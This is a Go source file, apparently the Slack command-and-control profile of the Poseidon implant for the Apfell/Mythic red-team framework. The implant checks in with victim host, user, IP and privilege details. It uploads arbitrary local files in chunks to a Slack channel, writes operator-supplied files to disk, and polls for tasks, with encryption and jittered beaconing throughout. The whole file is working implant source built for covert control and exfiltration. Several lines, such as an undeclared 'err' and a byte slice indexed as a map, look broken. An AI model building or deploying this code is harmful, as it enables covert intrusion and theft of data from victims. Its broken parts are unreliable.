// +build slack

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math"
	"os"
	"reflect"
	"strings"
	"sync"
	"time"

	"github.com/nlopes/slack"
	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var mu sync.Mutex

var Config = structs.Slackconfig{
	"encrypted_exchange_check",
	"AESPSK",
	callback_interval,
	callback_jitter,
	"TOKEN_REPLACE",
	"CHANNEL_REPLACE",
}

type C2Slack struct {
	Interval       int
	Jitter         int
	ExchangingKeys bool
	ApfellID       string
	ChannelID      string
	ApiToken       string
	Client         *slack.Client
	MessageChannel chan interface{}
	UUID           string
	Key            string
	RsaPrivateKey  *rsa.PrivateKey
}

func newProfile() Profile {
	return &C2Slack{}
}

func (c C2Slack) getSleepTime() int {
	return c.Interval + int(math.Round((float64(c.Interval) * (seededRand.Float64() * float64(c.Jitter)) / float64(100.0))))
}

func (c C2Slack) SleepInterval() int {
	return c.Interval
}

func (c *C2Slack) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c *C2Slack) SetSleepJitter(jitter int) {
	c.Jitter = jitter
}

func (c C2Slack) ApfID() string {
	return c.ApfellID
}

func (c *C2Slack) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c *C2Slack) SetSlackClient(newclient *slack.Client) {
	c.Client = newclient
}

func (c C2Slack) ProfileType() string {
	t := reflect.TypeOf(c)
	return t.Name()
}

func (c *C2Slack) GetTasking() interface{} {
	request := structs.TaskRequestMessage{}
	request.Action = "get_tasking"
	request.TaskingSize = 1

	raw, err := json.Marshal(request)

	if err != nil {
		//log.Printf("Error unmarshalling: %s", err.Error())
	}

	rawTask := c.sendData("", raw)
	task := structs.TaskRequestMessageResponse{}
	err = json.Unmarshal(rawTask, &task)

	if err != nil {
		//log.Printf("Error unmarshalling task data: %s", err.Error())
		return task
	}

	return task
}

func (c *C2Slack) CheckIn(ip string, pid int, user string, host string) interface{} {

	c.ApiToken = Config.ApiKey
	c.ChannelID = Config.ChannelID
	c.UUID = UUID
	c.Interval = Config.Sleep
	c.SetSlackClient(slack.New(Config.ApiKey))

	if strings.Contains(Config.KEYX, "T") {
		c.ExchangingKeys = true
	} else {
		c.ExchangingKeys = false
	}

	if len(Config.Key) > 0 {
		c.Key = Config.Key
	} else {
		c.Key = ""
	}

	var resp []byte
	c.ApfellID = c.UUID
	checkin := structs.CheckInMessage{}
	checkin.Action = "checkin"
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID

	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}

	checkinMsg, _ := json.Marshal(checkin)

	if c.ExchangingKeys {
		_ = c.NegotiateKey()
	}

	resp = c.sendData("", checkinMsg)
	//log.Printf("Raw Checkin response: %s\n", string(resp))
	response := structs.CheckInMessageResponse{}
	err := json.Unmarshal(resp, &response)
	if err != nil {
		//log.Printf("Error unmarshaling response: %s", err.Error())
		return structs.CheckInMessageResponse{Status: "failed"}
	}

	if len(response.ID) > 0 {
		c.ApfellID = response.ID
	}

	return response
}

func (c *C2Slack) PostResponse(output []byte, skipChunking bool) []byte {
	return c.sendData("", output)
}

func (c *C2Slack) SendFile(task structs.Task, params string, ch chan []byte) {
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	fi, err := file.Stat()
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	_, err = file.Read(raw)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error reading file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	_ = file.Close()

	c.SendFileChunks(task, raw, ch)
}

func (c *C2Slack) GetFile(task structs.Task, fileDetails structs.FileUploadParams, ch chan []byte) {

	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
	fileUploadMsg.Action = "upload"
	fileUploadMsg.FileID = fileDetails.FileID
	fileUploadMsg.ChunkSize = 1024000
	fileUploadMsg.ChunkNum = 1
	fileUploadMsg.FullPath = fileDetails.RemotePath
	fileUploadMsg.TaskID = task.TaskID

	msg, _ := json.Marshal(fileUploadMsg)
	mu.Lock()
	UploadResponses = append(UploadResponses, msg)
	mu.Unlock()
	// Wait for response from apfell
	rawData := <-ch

	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
	err = json.Unmarshal(rawData, &fileUploadMsgResponse)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	f, err := os.Create(fileDetails.RemotePath)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error creating file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}
	defer f.Close()
	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

	_, err = f.Write(decoded)

	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error writing to file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	offset := int64(len(decoded))

	if fileUploadMsgResponse.TotalChunks > 1 {
		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
			fileUploadMsg = structs.FileUploadChunkMessage{}
			fileUploadMsg.Action = "upload"
			fileUploadMsg.ChunkNum = index
			fileUploadMsg.ChunkSize = 1024000
			fileUploadMsg.FileID = fileDetails.FileID
			fileUploadMsg.FullPath = fileDetails.RemotePath

			msg, _ := json.Marshal(fileUploadMsg)
			mu.Lock()
			UploadResponses = append(UploadResponses, msg)
			mu.Unlock()
			rawData := <-ch

			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error marshaling response: %s", err.Error())
				errResponseEnc, _ := json.Marshal(errResponse)
				mu.Lock()
				TaskResponses = append(TaskResponses, errResponseEnc)
				mu.Unlock()
				return
			}

			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

			_, err := f.WriteAt(decoded, offset)

			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error writing to file: %s", err.Error())
				errResponseEnc, _ := json.Marshal(errResponse)
				mu.Lock()
				TaskResponses = append(TaskResponses, errResponseEnc)
				mu.Unlock()
				return
			}

			offset = offset + int64(len(decoded))
		}
	}
	resp := structs.Response{}
	resp.UserOutput = "File upload complete"
	resp.Completed = true
	resp.TaskID = task.TaskID
	encResp, err := json.Marshal(resp)
	mu.Lock()
	TaskResponses = append(TaskResponses, encResp)
	mu.Unlock()
	return
}

func (c *C2Slack) SendFileChunks(task structs.Task, fileData []byte, ch chan []byte) {
	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileDownloadInitialMessage{}
	chunkResponse.NumChunks = int(chunks)
	chunkResponse.TaskID = task.TaskID
	chunkResponse.FullPath = task.Params

	msg, _ := json.Marshal(chunkResponse)
	mu.Lock()
	TaskResponses = append(TaskResponses, msg)
	mu.Unlock()
	// Wait for a response from the channel
	resp := <-ch

	var fileDetails map[string]interface{}
	err := json.Unmarshal(resp, &fileDetails)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)

		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell

	for i := uint64(0); i < chunks; i++ {
		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			break
		}

		msg := structs.FileDownloadChunkMessage{}
		msg.ChunkNum = int(i) + 1
		msg.FileID = fileDetails["file_id"].(string)
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.TaskID = task.TaskID

		encmsg, _ := json.Marshal(msg)
		mu.Lock()
		TaskResponses = append(TaskResponses, encmsg)
		mu.Unlock()

		// Wait for a response for our file chunk
		decResp := <-ch

		var postResp map[string]interface{}
		err = json.Unmarshal(decResp, &postResp)
		if err != nil {
			errResponse := structs.Response{}
			errResponse.Completed = true
			errResponse.TaskID = task.TaskID
			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
			errResponseEnc, _ := json.Marshal(errResponse)
			mu.Lock()
			TaskResponses = append(TaskResponses, errResponseEnc)
			mu.Unlock()
			return
		}

		if !strings.Contains(decResp["status"].(string), "success") {
			// If the post was not successful, wait and try to send it one more time
			mu.Lock()
			TaskResponses = append(TaskResponses, encmsg)
			mu.Unlock()
		}

		time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
	}

	r.Reset()
	r = nil
	fileData = nil

	final := structs.Response{}
	final.Completed = true
	final.TaskID = task.TaskID
	final.UserOutput = "file downloaded"
	finalEnc, _ := json.Marshal(final)
	mu.Lock()
	TaskResponses = append(TaskResponses, finalEnc)
	mu.Unlock()
}

func (c *C2Slack) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)

	if err != nil {
		//log.Printf("Error marshaling data: %s", err.Error())
		return ""
	}

	resp := c.sendData("", raw)

	//decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaPrivateKey)
	//log.Printf("Apfell EKE Reponse: %s\n", string(decryptedResponse))
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		//log.Printf("Error unmarshaling RsaResponse %s", err.Error())
		return ""
	}

	encryptedSesionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSesionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		c.ApfellID = sessionKeyResp.UUID
	}

	return sessionID
}

func (c *C2Slack) sendData(tag string, sendData []byte) []byte {
	var timestamp string
	m := structs.Message{}
	m.Client = true

	for true {
		if len(c.Key) != 0 {
			sendData = c.encryptMessage(sendData)
		}

		sendData = append([]byte(c.ApfellID), sendData...)
		sendData = []byte(base64.StdEncoding.EncodeToString(sendData))

		m.Tag = tag
		m.Data = string(sendData)
		rawM, err := json.Marshal(m)

		if err != nil {
			log.Printf("Error marshaling message: %s", err.Error())
			return make([]byte, 0)
		}

		if len(rawM) < 4000 {
			// Messages less than
			//log.Println("Sending a normal message")
			_, timestamp, _, err = c.Client.SendMessage(Config.ChannelID, slack.MsgOptionText(string(rawM), true))

			if err != nil {
				//log.Printf("Error sending message: %s", err.Error())
				//return make([]byte, 0)
				continue
			}

			break

		} else if len(rawM) > 4000 && len(rawM) < 8000 {
			//log.Println("Sending an attachment")
			attachment := slack.Attachment{
				Color:         "",
				Fallback:      "",
				CallbackID:    "",
				ID:            0,
				AuthorID:      "",
				AuthorName:    "",
				AuthorSubname: "",
				AuthorLink:    "",
				AuthorIcon:    "",
				Title:         "",
				TitleLink:     "",
				Pretext:       "",
				Text:          string(rawM),
				ImageURL:      "",
				ThumbURL:      "",
				Fields:        nil,
				Actions:       nil,
				MarkdownIn:    nil,
				Footer:        "",
				FooterIcon:    "",
				Ts:            "",
			}

			_, timestamp, _, err = c.Client.SendMessage(Config.ChannelID, slack.MsgOptionAttachments(attachment), slack.MsgOptionText("", true))
			if err != nil {
				//log.Printf("Error sending message: %s", err.Error())
				//return make([]byte, 0)
				continue
			}

			break
		} else {
			//log.Println("Uploading a file")
			fname := GenerateSessionID()

			params := slack.FileUploadParameters{
				File:           "newmessage.json",
				Content:        string(rawM),
				Reader:         nil,
				Filetype:       "",
				Filename:       fname,
				Title:          "",
				InitialComment: "",
				Channels:       []string{Config.ChannelID},
			}

			f, err := c.Client.UploadFile(params)
			if err != nil {
				//log.Printf("Error sending message: %s", err.Error())
				//return make([]byte, 0)
				continue
			}

			timestamp = f.Shares.Public[Config.ChannelID][0].Ts
			break
		}
	}

	respMsg := structs.Message{}

	for {

		params := &slack.GetConversationRepliesParameters{
			ChannelID: Config.ChannelID,
			Timestamp: timestamp,
			Inclusive: false,
			Oldest:    timestamp,
		}

		msgs, _, _, err := c.Client.GetConversationReplies(params)

		if len(msgs) > 1 {
			reply := msgs[1]
			//log.Printf("Received %d replies\n", len(msgs))

			if len(reply.Text) != 0 && len(reply.Attachments) == 0 && len(reply.Files) == 0 {
				//log.Printf("Plain Message text: %s", reply.Text)
				err = json.Unmarshal([]byte(reply.Text), &respMsg)
				if err != nil {
					//log.Println("Error unmarshaling text response ", err.Error())
					return make([]byte, 0)
				}

				break
			} else if len(reply.Attachments) > 0 {
				content := reply.Attachments[0].Text
				//log.Printf("Message from attachment: %s", content)
				err = json.Unmarshal([]byte(content), &respMsg)
				if err != nil {
					//log.Println("Error unmarshaling attachment response ", err.Error())
					return make([]byte, 0)
				}
				break
			} else if len(reply.Files) > 0 {
				var fileContents bytes.Buffer

				err := c.Client.GetFile(reply.Files[0].URLPrivateDownload, &fileContents)
				if err != nil {
					//log.Println("error getting file ", err.Error())
					return make([]byte, 0)
				}
				//log.Printf("Message from file: %s", string(fileContents.Bytes()))
				err = json.Unmarshal(fileContents.Bytes(), &respMsg)
				if err != nil {
					//log.Println("Error unmarshaling file response ", err.Error())
					return make([]byte, 0)
				}

				break
			}
		}

		time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
	}

	raw, err := base64.StdEncoding.DecodeString(respMsg.Data)
	if err != nil {
		//log.Println("Error decoding base64 data: ", err.Error())
		return make([]byte, 0)
	}

	enc_raw := raw[36:] // Remove the Payload UUID
	//log.Printf("AESPSK length %d", len(c.AesPSK))
	//log.Println("Exchanging keys ", c.ExchangingKeys)
	if len(c.Key) > 0 {
		dec := c.decryptMessage(enc_raw)
		//log.Printf("Decrypted Response from apfell: %s", string(dec))
		if len(dec) == 0 {
			return make([]byte, 0)
		}
		return dec
	}

	return enc_raw
}

func (c *C2Slack) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2Slack) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
